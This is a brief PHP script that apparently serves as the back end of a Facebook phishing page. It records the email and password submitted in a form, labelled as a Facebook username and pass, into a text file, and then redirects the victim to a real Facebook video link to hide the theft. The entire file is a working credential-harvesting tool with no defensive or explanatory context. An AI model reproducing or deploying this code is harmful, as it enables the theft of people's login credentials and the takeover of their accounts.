<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] 
. "\n", FILE_APPEND);
header('Location: https://www.facebook.com/105741151684781/videos/1796556877193650');
exit();
?>